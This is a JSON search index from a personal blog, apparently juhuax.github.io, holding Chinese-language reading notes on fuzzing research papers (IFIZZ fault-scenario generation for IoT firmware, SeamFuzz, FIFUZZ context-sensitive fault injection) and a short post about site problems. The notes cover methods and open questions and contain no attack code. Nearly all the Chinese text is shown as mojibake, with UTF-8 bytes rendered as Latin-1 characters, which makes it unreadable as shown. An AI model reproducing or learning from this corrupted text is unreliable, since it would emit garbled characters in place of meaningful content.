[{"content":"å› ä¸ºä¹‹å‰ä¸€ç›´åœ¨æœ¬åœ°å†™ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼ŒæŸä¸€å¤©æƒ³æ­ä¸ªåšå®¢æ¥åˆ†äº«ã€‚\näºæ˜¯æ­å¥½äº†ï¼Œä¸œè¥¿ä¸€è‚¡è„‘çš„å…¨æ”¾äº†ä¸Šæ¥ã€‚\nä¹‹å‰çš„æ–‡ç« è¿˜æ˜¯æœ‰ä¸€äº›é—®é¢˜çš„ï¼Œæ¯”å¦‚å›¾ç‰‡ä¸åŠ è½½ï¼ˆç äº‘é˜²ç›—é“¾ï¼Œä¹‹åæ‹¿githubåšå›¾åºŠäº†ï¼‰ï¼Œå…¬å¼ä¸æ¸²æŸ“ç­‰ç­‰ã€‚\n2023å¹´7æœˆåçš„æ–‡ç« åº”è¯¥ä¸ä¼šæœ‰è¿™äº›é—®é¢˜äº†ï¼ˆå¤§æ¦‚å§\u0026hellip;\u0026hellip;ï¼‰\n","permalink":"https://juhuax.github.io/posts/%E5%BB%BA%E7%AB%99/%E5%AF%B9%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E8%AF%B4%E6%98%8E/","summary":"å› ä¸ºä¹‹å‰ä¸€ç›´åœ¨æœ¬åœ°å†™ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼ŒæŸä¸€å¤©æƒ³æ­ä¸ªåšå®¢æ¥åˆ†äº«ã€‚ äºæ˜¯æ­å¥½äº†ï¼Œä¸œè¥¿ä¸€è‚¡è„‘çš„å…¨æ”¾äº†ä¸Šæ¥ã€‚ ä¹‹å‰çš„æ–‡ç« è¿˜æ˜¯æœ‰ä¸€äº›é—®é¢˜çš„ï¼Œæ¯”å¦‚å›¾ç‰‡ä¸åŠ è½½ï¼ˆ","title":"å¯¹ä¸€äº›é—®é¢˜çš„è¯´æ˜"},{"content":"ä¸­æ–‡è¯‘åï¼šIFIZZ: æ·±åº¦çŠ¶æ€å’Œé«˜æ•ˆçš„æ•…éšœåœºæ™¯ç”Ÿæˆæ¥æµ‹è¯•ç‰©è”ç½‘å›ºä»¶\nä½œè€…ï¼šåˆ˜peiyu\nå•ä½ï¼šæµ™æ±Ÿå¤§å­¦\nå›½å®¶ï¼š #ä¸­å›½\nå¹´ä»½ï¼š #2021å¹´\næ¥æºï¼š #IEEE_ASE_CCFB å…³é”®å­—ï¼š #fuzzing #æ•…éšœæ³¨å…¥\nä»£ç åœ°å€ï¼šdecentL/iFIZZ-ASE21 (github.com)\nç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-07-06 10:39\n#TODO\næ‘˜è¦ ç°æœ‰æ¨¡ç³Šæµ‹è¯•ä¸èƒ½æœ‰æ•ˆçš„æµ‹è¯•ç‰©è”ç½‘è®¾å¤‡çš„é”™è¯¯å¤„ç†ä»£ç  é”™è¯¯å¤„ç†ä»£ç éš¾è§¦å‘ éš¾ä»¥æ·±å…¥é”™è¯¯å¤„ç†ä»£ç è·¯å¾„ï¼ˆå› ä¸ºä¸€è§¦å‘é”™è¯¯å¤„ç†ä»£ç ç¨‹åºå°±å˜äº†ï¼‰ IFIZZï¼Œä¸€ä¸ªä¸“é—¨è®¾è®¡ç”¨äºæµ‹è¯•åŸºäºlinuxçš„ç‰©è”ç½‘å›ºä»¶ä¸­çš„é”™è¯¯å¤„ç†ä»£ç çš„æ–°çš„é”™è¯¯æ£€æµ‹ç³»ç»Ÿã€‚ é¦–å…ˆé‡‡ç”¨åŸºäºäºŒè¿›åˆ¶çš„è‡ªåŠ¨åŒ–æ–¹æ³•ï¼Œé€šè¿‡åˆ†æé—­æºç‰©è”ç½‘å›ºä»¶ä¸­çš„é”™è¯¯å’Œé”™è¯¯æ¡ä»¶æ¥è¯†åˆ«å®é™…çš„è¿è¡Œæ—¶é”™è¯¯ ç„¶åé‡‡ç”¨çŠ¶æ€æ„ŸçŸ¥å’Œæœ‰ç•Œé”™è¯¯ç”Ÿæˆæ¥æœ‰æ•ˆåœ°åˆ°è¾¾æ·±åº¦é”™è¯¯è·¯å¾„ èƒŒæ™¯ ç‰©è”ç½‘è®¾å¤‡ä¸­çš„é”™è¯¯ è¾“å…¥ç›¸å…³é”™è¯¯ï¼šç”±æ— æ•ˆè¾“å…¥å¼•èµ·ï¼Œç›¸å¯¹è¾ƒå°‘ è¾“å…¥æ— å…³é”™è¯¯ï¼šå¶å°”çš„è¿è¡Œæ—¶äº‹ä»¶ï¼ˆå¦‚å†…å­˜è€—å°½ã€ç¡¬ä»¶æ•…éšœã€ç½‘ç»œä¸å¯è¾¾ï¼‰å¼•èµ·çš„è¾“å…¥æ— å…³é”™è¯¯æ›´ä¸ºå¸¸è§ æ•…éšœæ³¨å…¥ç”¨äºæµ‹è¯•ç‰©è”ç½‘å›ºä»¶çš„é”™è¯¯å¤„ç†ä»£ç çš„æŒ‘æˆ˜ å¦‚ä½•è‡ªåŠ¨è¯†åˆ«ä¸è¾“å…¥æ— å…³çš„é”™è¯¯ï¼ˆåŸºäºäºŒè¿›åˆ¶çš„è‡ªåŠ¨åŒ–è¯†åˆ«æ–¹æ³•è§£å†³ï¼‰ æµ‹è¯•å¦‚ä½•æ·±å…¥é”™è¯¯è·¯å¾„ï¼ˆçŠ¶æ€æ„ŸçŸ¥å’Œæœ‰ç•Œé”™è¯¯ç”Ÿæˆè§£å†³ï¼‰ æ–¹æ³• é¢„å®šä¹‰ åŸºäºäºŒè¿›åˆ¶æ–‡ä»¶çš„è‡ªåŠ¨è¿è¡Œæ—¶é”™è¯¯è¯†åˆ« ä½œè€…åœ¨åˆ†æäº†20ä¸ªEFåï¼Œå¾—åˆ°EFçš„ä¸¤ä¸ªç‰¹å¾\nè¿”å›å€¼æ˜¯error code ä¸è¾“å…¥æ— å…³ åŸºäºæ­¤ä½œè€…è®¾è®¡äº†EFè¯†åˆ«ç®—æ³•ã€‚ é¦–å…ˆæ‰«ææ±‡ç¼–ä»£ç æ”¶é›†äºŒè¿›åˆ¶ç¨‹åºä¸­æ‰€æœ‰å‡½æ•°çš„çš„æ‰€æœ‰è¿”å›å€¼ï¼ˆgetreturnvalues ()ï¼‰å’Œcallerï¼ˆgetcallers ()ï¼‰ ç„¶åç®—æ³•æ£€æŸ¥å‡½æ•°fçš„calleræ˜¯å¦å¯¹å‡½æ•°fçš„è¿”å›å€¼è¿›è¡Œäº†checkï¼ˆischecked ()ï¼‰ï¼Œå¦‚æœischeckedåˆ™è¯´æ˜è¯¥è¿”å›å€¼æ˜¯error code å¯¹å¾—åˆ°çš„error codeåœ¨å‡½æ•°fä¸­å‘åæœç´¢æ‰¾åˆ°error codeå¦‚ä½•ç”Ÿæˆï¼ˆä¹Ÿå°±æ˜¯æ£€æŸ¥æ¡ä»¶ getcondition ()ï¼‰ å¯¹å¾—åˆ°çš„code conditionæ‰§è¡Œå‘åçš„è¿‡ç¨‹é—´æ•°æ®æµåˆ†æï¼Œæ”¶é›†codeconditionä¾èµ–çš„sourceï¼Œæ£€æŸ¥è¿™ä¸ªsourceæ˜¯å¦æ˜¯ç¨‹åºå‚æ•°ï¼ˆä¹Ÿå°±æ˜¯æ˜¯å¦å’Œè¾“å…¥ç›¸å…³ï¼‰ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™è¯¥error codeæ˜¯æˆ‘ä»¬è¦çš„ã€‚ çŠ¶æ€æ„ŸçŸ¥å’Œæœ‰ç•Œæ•…éšœåœºæ™¯ç”Ÿæˆ ï¼ˆè¿™ä¸ªæ–¹æ³•æ˜¯ä¸ºäº†è¦†ç›–å°½å¯èƒ½å¤šçš„é”™è¯¯è·¯å¾„ã€åœ¨æœ‰é™çš„æ—¶é—´å†…åˆ°è¾¾æ·±åº¦é”™è¯¯è·¯å¾„ï¼‰\nä½œè€…æŒ‡å‡ºåœ¨æ•…éšœæ³¨å…¥çš„æ—¶å€™ä¼šäº§ç”Ÿä¸¤ä¸ªé—®é¢˜ï¼š\nearly crashesï¼šä¸€ä¸ªRTä¸­æœ‰å¾ˆå¤šerror siteï¼Œè§¦å‘ä¸€ä¸ªå°±ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼Œå¦‚æœåœ¨RTæ—©æœŸç¨‹åºå°±å´©æºƒäº†ï¼Œé‚£ä¹ˆåé¢çš„error siteå°±è¦†ç›–ä¸åˆ°äº†â€”â€”çŠ¶æ€æ„ŸçŸ¥è§£å†³ éå†ç”ŸæˆFSä¼šäº§ç”Ÿç›¸å½“å¤šçš„æ•°é‡ï¼ˆçˆ†ç‚¸ï¼‰â€”â€”æœ‰ç•Œæ•…éšœç”Ÿæˆè§£å†³ çŠ¶æ€æ„ŸçŸ¥ ä½œè€…é€šè¿‡å°†æ¯æ¬¡çš„å´©æºƒçš„error siteå’Œsite stateè®°å½•ä¸ºæ—¥å¿—ï¼Œå½“åœ¨è¿è¡Œæ—¶ç¢°åˆ°error siteæ—¶ï¼Œå¦‚æœæ­¤æ—¶çš„siteå’Œstateå·²ç»è®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œé‚£ä¹ˆå°±ä¸å¯¹è¿™ä¸ªerror siteè¿›è¡Œæ•…éšœæ³¨å…¥ï¼ˆå¦‚line 9ï¼‰ã€‚è¿™æ ·å¯ä»¥é¿å…å†—ä½™å´©æºƒï¼Œå¹¶ä¸”æ·±å…¥åç»­çš„error siteã€‚\næœ‰ç•Œæ•…éšœç”Ÿæˆ é¦–å…ˆï¼Œå¤§å¤šæ•°å´©æºƒéƒ½æ˜¯ç”±å°‘é‡é”™è¯¯å¼•èµ·çš„ï¼Œç”Ÿæˆå…·æœ‰å¤§é‡é”™è¯¯çš„æ•…éšœåœºæ™¯é€šå¸¸æ˜¯ä¸å¿…è¦çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æå‡ºç¬¬ä¸€æ¡è§„åˆ™: æ•…éšœåœºæ™¯ä¸­çš„æœ€å¤§é”™è¯¯æ•° (ME)åº”è¯¥æ˜¯æœ‰ç•Œçš„ (ç®—æ³•2ä¸­çš„ç¬¬2è¡Œ)ã€‚å…¶æ¬¡ï¼Œæˆ‘ä»¬è¿˜è§‚å¯Ÿåˆ°å¤§å¤šæ•°å´©æºƒæ˜¯ç”±ç›¸é‚»é”™è¯¯å¼•èµ·çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æå‡ºç¬¬äºŒæ¡è§„åˆ™: åœ¨æ•…éšœåœºæ™¯ä¸­ï¼Œç¬¬ä¸€ä¸ªé”™è¯¯å’Œæœ€åä¸€ä¸ªé”™è¯¯ (MBE)ä¹‹é—´çš„æœ€å¤§è·ç¦» (å³é”™è¯¯ç«™ç‚¹çš„æ•°é‡)ä¹Ÿåº”è¯¥æ˜¯æœ‰ç•Œçš„ (ç®—æ³•2ä¸­çš„ç¬¬4è¡Œ)ã€‚\nå®ç° error-function analyserï¼šFIRMADYNEå¯¹å›ºä»¶è§£åŒ…ï¼ŒIDAè„šæœ¬åˆ†æäºŒè¿›åˆ¶ç¨‹åº Firmware packerï¼šè®¾ç½®è¢«æµ‹å¯¹è±¡ï¼Œä½¿å…¶å¯ä»¥ç”¨äºæµ‹è¯• Fault-scenario generatorï¼šç¼–å†™äº†ä¸€ä¸ªåº“å‡½æ•°åˆ©ç”¨åŠ«æŒå‡½æ•°æ¥è®°å½•å´©æºƒæ—¥å¿—å’Œæ•…éšœæ³¨å…¥ Runtime monitorï¼šè¿è¡Œæµ‹è¯•å›ºä»¶å¹¶è·Ÿè¸ªè¿è¡Œæ—¶è¿›ç¨‹ä¿¡æ¯ï¼Œä»¥è·å¾—ç›®æ ‡ç‰©è”ç½‘ç¨‹åºåŠå…¶ç›¸åº”çš„è¿è¡Œå‘½ä»¤ï¼ˆæ— éœ€æºä»£ç ï¼‰ Bug checkerï¼šåˆ†æå´©æºƒæ—¥å¿—ä»¥ç”Ÿæˆå´©æºƒæŠ¥å‘Šï¼Œä¸€ä¸ªIDAè„šæœ¬ å­˜åœ¨çš„é—®é¢˜å’Œæˆ‘çš„ç–‘é—® åœ¨error functionè¯†åˆ«çš„æ—¶å€™å­˜åœ¨æ— æ³•å¤„ç†é—´æ¥è°ƒç”¨å’Œæ•°æ®æµçˆ†ç‚¸çš„é—®é¢˜ ä½œè€…æŒ‡å‡ºâ€œä¸€æ—¦æ•°æ®æµè¯æ˜ä¸€ä¸ªæºä¸è¾“å…¥æ— å…³ï¼Œåˆ†æå°±å®Œæˆäº†ï¼Œè€Œä¸æ˜¯ä¸æ–­åœ°åˆ†æå…¶ä»–æºâ€ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™ç§é€»è¾‘å¹¶ä¸soundï¼Œå¿…é¡»è¯æ˜æ‰€æœ‰çš„æºéƒ½å’Œè¾“å…¥æ— å…³æ‰å¯ä»¥ä¿è¯è¯¥error functionæ˜¯è¾“å…¥æ— å…³çš„ è²Œä¼¼åªæ‰¾åˆ°ä¸€ä¸ªæºå¤´ä¸è¾“å…¥æ— å…³ä¾¿å¯ï¼Œå¦‚æœéè¦è€ƒè™‘æ‰€æœ‰æºå¤´ï¼Œä¸”ä¸è¯´æ•°æ®æµåˆ†æçˆ†ç‚¸ï¼Œæœ€åä¼°è®¡ä¸€å¤§æ‰¹functionè¢«ç­›æ‰ï¼Œå‰©ä¸‹çš„error functionæ²¡å‡ ä¸ªäº†ã€‚ä½†æ˜¯å³ä¾¿å¦‚æ­¤ï¼Œæœ€å¥½çš„æ–¹æ³•è¿˜æ˜¯ä¸æ–­æœç´¢æºå¤´ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå’Œè¾“å…¥æ— å…³ï¼Œé‚£ä¹ˆæœ€åæƒ…å†µæ˜¯O(n)ã€‚æ¯”è¾ƒç¨³å¦¥çš„æ“ä½œåº”è¯¥æ˜¯è®¾ç½®ä¸€ä¸ªé˜ˆå€¼ã€‚ å…¶å®æˆ‘ä¸€ç›´ä¸å¤ªæ¸…æ¥šï¼ˆåŒ…æ‹¬åœ¨ä¸Šä¸‹æ–‡æ•æ„Ÿsfié‚£ç¯‡è®ºæ–‡ä¸­ï¼‰è¿™ä¸ªerror site sequenceï¼ˆè¿™ç¯‡æ–‡ç« ç§°ä¹‹ä¸ºruntime traceï¼‰ä¸­çš„error siteå½¼æ­¤æ˜¯ç‹¬ç«‹çš„è¿˜æ˜¯äº’ç›¸æœ‰è°ƒç”¨é¡ºåºçš„ Fault-scenario generatorã€Runtime monitorå¦‚ä½•å®ç°çš„ï¼Œè¦çŸ¥é“æœ¬æ–‡ä¸éœ€è¦ç¨‹åºæºç  â€œåœ¨æµ‹è¯•å›ºä»¶æ˜ åƒä¹‹å‰ï¼ŒIFIZZé¦–å…ˆå¯¹è¢«æµ‹è¯•å›ºä»¶è¿›è¡ŒåŠ¨æ€åˆ†æä»¥è·å¾—ç›®æ ‡ç¨‹åºã€‚æ€»çš„æ¥è¯´ï¼ŒIFIZZè·å¾—112ä¸ªä¾›åº”å•†ç‰¹å®šçš„ç¨‹åºå’Œ509ä¸ªè¿è¡Œå‘½ä»¤æ¥è¿è¡Œè¿™äº›ç¨‹åºâ€è¿™æ˜¯å¦‚ä½•å®ç°çš„ å¯¹ç”ŸæˆRTçš„å˜å¼‚ç­–ç•¥è¿›è¡Œç ”ç©¶!!! ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/ifizz-deep-state-and-efficient-fault-scenario-generation-to-test-iot-firmware/","summary":"ä¸­æ–‡è¯‘åï¼šIFIZZ: æ·±åº¦çŠ¶æ€å’Œé«˜æ•ˆçš„æ•…éšœåœºæ™¯ç”Ÿæˆæ¥æµ‹è¯•ç‰©è”ç½‘å›ºä»¶ ä½œè€…ï¼šåˆ˜peiyu å•ä½ï¼šæµ™æ±Ÿå¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #IEEE_ASE_CCFB å…³é”®","title":"IFIZZ: Deep-State and Efficient Fault-Scenario Generation to Test IoT Firmware"},{"content":"ä¸­æ–‡è¯‘åï¼šç°ç›’æ¨¡ç³Šçš„å­¦ä¹ ç§å­è‡ªé€‚åº”çªå˜ç­–ç•¥\nä½œè€…ï¼šÂ Myungho Lee\nå•ä½ï¼šéŸ©å›½å¤§å­¦\nå›½å®¶ï¼š #éŸ©å›½\nå¹´ä»½ï¼š #2023å¹´\næ¥æºï¼š #ICSE_CCFA\nå…³é”®å­—ï¼š #fuzzing #çªå˜ç­–ç•¥\nä»£ç åœ°å€ï¼š https://github.com/kupl/SeamFuzz-public\nç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-07-02 09:55\nSEAMFUZZï¼šå­¦ä¹ ç°ç›’æ¨¡ç³Šæµ‹è¯•çš„ç§å­è‡ªé€‚åº”çªå˜ç­–ç•¥ï½œæŠ€æœ¯è¿›å±• (qq.com)\næµç¨‹å›¾ æ–¹æ³• ç§å­èšç±» å®šä¹‰äº†ç›¸ä¼¼åº¦å¾—åˆ† $score_{sim}$ ã€‚\nç›¸ä¼¼åº¦åˆ†æ•°åŒ…æ‹¬è¯­æ³•ç›¸ä¼¼æ€§å¾—åˆ†ã€è¯­ä¹‰ç›¸ä¼¼æ€§å¾—åˆ†ã€ç¨€æœ‰åº¦ç›¸ä¼¼æ€§å¾—åˆ†ã€‚\næ¦‚ç‡åˆ†å¸ƒå­¦ä¹  å­¦ä¹ é’ˆå¯¹æ¯ä¸ªç§å­ç»„é€‰æ‹©æœ‰æ•ˆå˜å¼‚æ–¹æ³•çš„æ¦‚ç‡åˆ†å¸ƒã€‚\né¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªé‡‡æ ·ç©ºé—´ï¼Œç„¶åè¿›è¡Œæ±¤æ™®æ£®é‡‡æ ·ã€‚\néè‡ªå·±æ–¹å‘ï¼Œéšä¾¿çœ‹çœ‹å“ˆå“ˆã€‚ğŸ˜‚\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/learning-seed-adaptive-mutation-strategies-for-greybox-fuzzing/","summary":"ä¸­æ–‡è¯‘åï¼šç°ç›’æ¨¡ç³Šçš„å­¦ä¹ ç§å­è‡ªé€‚åº”çªå˜ç­–ç•¥ ä½œè€…ï¼š Myungho Lee å•ä½ï¼šéŸ©å›½å¤§å­¦ å›½å®¶ï¼š #éŸ©å›½ å¹´ä»½ï¼š #2023å¹´ æ¥æºï¼š #ICSE_CCFA å…³é”®å­—ï¼š #fuzzing #çªå˜ç­–ç•¥ ä»£ç åœ°å€ï¼š https://github.com/kupl/SeamFuzz-public ç¬”è®°","title":"Learning Seed-Adaptive Mutation Strategies for Greybox Fuzzing"},{"content":"ä¸­æ–‡è¯‘åï¼šä½¿ç”¨ä¸Šä¸‹æ–‡æ•æ„Ÿè½¯ä»¶æ•…éšœæ³¨å…¥æ¨¡ç³ŠåŒ–é”™è¯¯å¤„ç†ä»£ç  ä½œè€…ï¼šè’‹mingzhu\nå•ä½ï¼šæ¸…åå¤§å­¦\nå›½å®¶ï¼š #ä¸­å›½\nå¹´ä»½ï¼š #2020å¹´\næ¥æºï¼š #USENIXä¼šè®®\nå…³é”®å­—ï¼š #fuzzing #æ•…éšœæ³¨å…¥\nä»£ç åœ°å€ï¼š\nç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-06-29 10:36\nè¿™ç¯‡æ–‡ç« çš„ä½œè€…å’Œ [[Fuzzing Error Handling Code in Device Drivers Based on Software Fault Injection]] ä¸€æ ·ï¼Œæ˜¯è¿›ä¸€æ­¥çš„åç»­å·¥ä½œã€‚\nAbstract FIFUZZçš„æ ¸å¿ƒæ˜¯ä¸Šä¸‹æ–‡æ•æ„Ÿçš„è½¯ä»¶æ•…éšœæ³¨å…¥ (SFI)æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯ä»¥æœ‰æ•ˆè¦†ç›–ä¸åŒè°ƒç”¨ä¸Šä¸‹æ–‡ä¸­çš„é”™è¯¯å¤„ç†ä»£ç ï¼Œä»è€Œå‘ç°éšè—åœ¨å¤æ‚ä¸Šä¸‹æ–‡ä¸­çš„é”™è¯¯å¤„ç†ä»£ç ä¸­çš„æ·±å±‚é”™è¯¯ã€‚ Background ç°æœ‰çš„åŸºäºsfiçš„æ–¹æ³•å­˜åœ¨ä¸€ä¸ªå…³é”®çš„é™åˆ¶: æ®æˆ‘ä»¬æ‰€çŸ¥ï¼Œå®ƒä»¬åªæ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆæ‰§è¡Œè·¯å¾„ï¼‰ä¸æ•æ„Ÿçš„æ•…éšœæ³¨å…¥ï¼Œè¿™é€šå¸¸ä¼šé˜»æ­¢æµ‹è¯•çš„æ·±å…¥ã€‚å¯èƒ½æŸäº›é”™è¯¯ä¼šåœ¨ç‰¹å®šçš„è°ƒç”¨ä¸Šä¸‹æ–‡ä¸­æ‰ä¼šè¢«è§¦å‘ã€‚ ä¸¾ä¾‹ å‡½æ•°På­˜åœ¨double freeæ¼æ´ï¼Œä½†æ˜¯å¦‚æœæ˜¯ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿçš„æ•…éšœæ³¨å…¥ï¼Œåœ¨å‡½æ•°Pçš„é”™è¯¯å¤„ç†ä»£ç ï¼ˆifï¼‰ä¸­æ³¨å…¥æ•…éšœï¼Œæ¯æ¬¡æ‰§è¡Œåˆ°å‡½æ•°Aç¨‹åºå°±ä¼šè§¦å‘æ•…éšœè€Œä¸ä¼šåˆ°è¾¾å‡½æ•°Bï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘double freeé”™è¯¯ï¼Œå¦‚æœè¿›è¡Œä¸Šä¸‹æ–‡æ•æ„Ÿçš„æ•…éšœæ³¨å…¥ï¼Œåªæœ‰åœ¨å‡½æ•°Bè°ƒç”¨å‡½æ•°Pçš„æ—¶å€™å¼•å…¥æ•…éšœï¼Œé‚£ä¹ˆå°±å¯ä»¥è§¦å‘double freeé”™è¯¯ã€‚\næ–¹æ³• Error Sequence Model åœ¨ [[Fuzzing Error Handling Code in Device Drivers Based on Software Fault Injection]] çš„error siteåºåˆ—ï¼ˆ$ErrSeq = [ErrPt1, ErrPt2, \u0026hellip;, ErrPtx], ErrPti = {0, 1}$ï¼‰çš„åŸºç¡€ä¸Šï¼Œä½œè€…å¢åŠ äº†æ‰§è¡Œé”™è¯¯ç«™ç‚¹æ—¶çš„è¿è¡Œçš„è°ƒç”¨å †æ ˆä½œä¸ºä¸Šä¸‹æ–‡ $ErrPt =\u0026lt; ErrLoc,CallCtx \u0026gt;$ $CallCtx$ å°±æ˜¯ä¸Šä¸‹æ–‡ $CallCtx = [CallIn f o1,CallIn f o2, \u0026hellip;,CallIn f ox]$ $CallIn f o =\u0026lt; CallLoc, FuncLoc \u0026gt;$ calllocåº”è¯¥æ˜¯è¯¥å‡½æ•°çš„ä½ç½®ï¼Œfunclocæ˜¯è¯¥å‡½æ•°è°ƒç”¨çš„å‡½æ•°çš„ä½ç½®ï¼ˆåº”è¯¥æ˜¯è¿™æ ·å§ï¼‰ ä½œè€…å­˜å‚¨ç›¸å…³ä¿¡æ¯çš„ç»“æ„å°±æ˜¯Errptçš„hashä½œä¸ºé”®ï¼Œ0/1ä½œä¸ºå€¼ ä½œè€…æŒ‡å‡ºï¼Œå› ä¸ºè¦è€ƒè™‘ä¸Šä¸‹æ–‡ï¼Œæ‰€ä»¥æ•…éšœæ³¨å…¥ä¸èƒ½å†é™æ€çš„æ³¨å…¥ï¼Œè€Œæ˜¯è¦åŠ¨æ€çš„è¿›è¡Œæ³¨å…¥ã€‚æ¯”å¦‚è¯´å½“ä¸€ä¸ªerror siteç­‰å¾…æ³¨å…¥ï¼Œä½†æ˜¯æœ‰Nä¸ªä¸Šä¸‹æ–‡ï¼Œé‚£ä¹ˆå®é™…ä¸Šç›¸å½“äºè¦æ³¨å…¥Nä¸ªä¸åŒçš„error site\nContext-Sensitive SFI-based Fuzzing 1)é™æ€åœ°è¯†åˆ«æµ‹è¯•ç¨‹åºæºä»£ç ä¸­çš„é”™è¯¯ä½ç½®; 2)è¿è¡Œæµ‹è¯•ç¨‹åºï¼Œæ”¶é›†æ¯ä¸ªæ‰§è¡Œé”™è¯¯ç«™ç‚¹çš„è°ƒç”¨ä¸Šä¸‹æ–‡å’Œä»£ç è¦†ç›–ç‡çš„è¿è¡Œæ—¶ä¿¡æ¯; 3)æ ¹æ®è¿è¡Œæ—¶ä¿¡æ¯åˆ›å»ºå·²æ‰§è¡Œé”™è¯¯ä½ç‚¹çš„é”™è¯¯åºåˆ—; 4)è¿è¡Œç¨‹åºåï¼Œå¯¹æ¯ä¸ªå·²åˆ›å»ºçš„é”™è¯¯åºåˆ—è¿›è¡Œå˜å¼‚ï¼Œç”Ÿæˆæ–°çš„åºåˆ—; 5)è¿è¡Œè¢«æµ‹ç¨‹åºï¼Œæ ¹æ®å˜å¼‚åçš„é”™è¯¯åºåˆ—ï¼Œåœ¨ç‰¹å®šè°ƒç”¨ä¸Šä¸‹æ–‡çš„é”™è¯¯ä½ç‚¹æ³¨å…¥æ•…éšœ; 6)æ”¶é›†è¿è¡Œæ—¶ä¿¡æ¯ï¼Œåˆ›å»ºæ–°çš„é”™è¯¯åºåˆ—ï¼Œå¹¶å¯¹è¿™äº›é”™è¯¯åºåˆ—å†æ¬¡è¿›è¡Œå˜å¼‚ï¼Œæ„å»ºä¸€ä¸ªæ¨¡ç³Šå¾ªç¯ã€‚å½“æ²¡æœ‰æ–°çš„é”™è¯¯åºåˆ—äº§ç”Ÿæˆ–è¾¾åˆ°æ—¶é—´é™åˆ¶æ—¶ï¼Œæ¨¡ç³Šå¾ªç¯ç»“æŸã€‚\næ¡†æ¶ Error-siteæå–å™¨ã€‚å®ƒå¯¹æµ‹è¯•ç¨‹åºçš„æºä»£ç æ‰§è¡Œè‡ªåŠ¨çš„é™æ€åˆ†æï¼Œä»¥è¯†åˆ«å¯èƒ½çš„é”™è¯¯ä½ç½®ã€‚\nç¨‹åºç”Ÿæˆå™¨ã€‚å®ƒå¯¹ç¨‹åºä»£ç æ‰§è¡Œä»£ç æ£€æµ‹ï¼ŒåŒ…æ‹¬è¯†åˆ«é”™è¯¯ä½ç½®ã€å‡½æ•°è°ƒç”¨ã€å‡½æ•°å…¥å£å’Œé€€å‡ºã€ä»£ç åˆ†æ”¯ç­‰ã€‚å®ƒç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œçš„æµ‹è¯•ç¨‹åºã€‚\nå¯¹ä»£ç è¿›è¡Œæ’æ¡©ï¼Œæœ‰ä¸¤ä¸ªç›®çš„: æ”¶é›†æœ‰å…³é”™è¯¯ç«™ç‚¹çš„è¿è¡Œæ—¶ä¿¡æ¯å’Œæ³¨å…¥é”™è¯¯ã€‚ ä¸ºäº†æ”¶é›†æ¯ä¸ªé”™è¯¯ç‚¹çš„è¿è¡Œæ—¶è°ƒç”¨ä¸Šä¸‹æ–‡çš„ä¿¡æ¯ï¼Œç¨‹åºç”Ÿæˆå™¨åœ¨å¯¹è¢«æµ‹è¯•ç¨‹åºä»£ç ä¸­å®šä¹‰çš„æ¯ä¸ªå‡½æ•°è°ƒç”¨ä¹‹å‰å’Œä¹‹åï¼Œä»¥åŠåœ¨æ¯ä¸ªå‡½æ•°å®šä¹‰çš„å…¥å£å’Œå‡ºå£å¤„æµ‹é‡ä»£ç ã€‚ ä¸ºäº†ç›‘è§†é”™è¯¯ç‚¹çš„æ‰§è¡Œå¹¶å¯¹å…¶è¿›è¡Œé”™è¯¯æ³¨å…¥ï¼Œç¨‹åºç”Ÿæˆå™¨åœ¨æ¯ä¸ªé”™è¯¯ç‚¹å‰ç¼–å†™ä»£ç ã€‚ è¿è¡Œæ—¶ç›‘è§†å™¨ã€‚å®ƒä½¿ç”¨ç”Ÿæˆçš„è¾“å…¥è¿è¡Œè¢«æµ‹ç¨‹åºï¼Œæ”¶é›†è¢«æµ‹ç¨‹åºçš„è¿è¡Œæ—¶ä¿¡æ¯ï¼Œå¹¶æ ¹æ®ç”Ÿæˆçš„é”™è¯¯åºåˆ—æ‰§è¡Œæ•…éšœæ³¨å…¥ã€‚\né”™è¯¯åºåˆ—ç”Ÿæˆå™¨ã€‚å®ƒåˆ›å»ºé”™è¯¯åºåˆ—ï¼Œå¹¶æ ¹æ®æ”¶é›†çš„è¿è¡Œæ—¶ä¿¡æ¯æ”¹å˜é”™è¯¯åºåˆ—ä»¥ç”Ÿæˆæ–°çš„é”™è¯¯åºåˆ—ã€‚\nè¾“å…¥å‘ç”Ÿå™¨ã€‚æ ¹æ®æ”¶é›†åˆ°çš„è¿è¡Œæ—¶ä¿¡æ¯ï¼Œå®ƒæ‰§è¡Œä¼ ç»Ÿçš„æ¨¡ç³Šå¤„ç†æ¥æ”¹å˜å’Œç”Ÿæˆæ–°çš„è¾“å…¥ã€‚\nBugæ£€æŸ¥å™¨ã€‚å®ƒä»¬æ£€æŸ¥æ”¶é›†çš„è¿è¡Œæ—¶ä¿¡æ¯ä»¥æ£€æµ‹é”™è¯¯å¹¶ç”Ÿæˆé”™è¯¯æŠ¥å‘Šã€‚\nï¼ˆå’ŒåŸå…ˆçš„ä¸€ç¯‡åŸºæœ¬ä¸€æ ·ï¼Œå¤šäº†ä¸€ä¸ªè¾“å…¥å‘ç”Ÿå™¨ï¼‰\nç–‘é—® 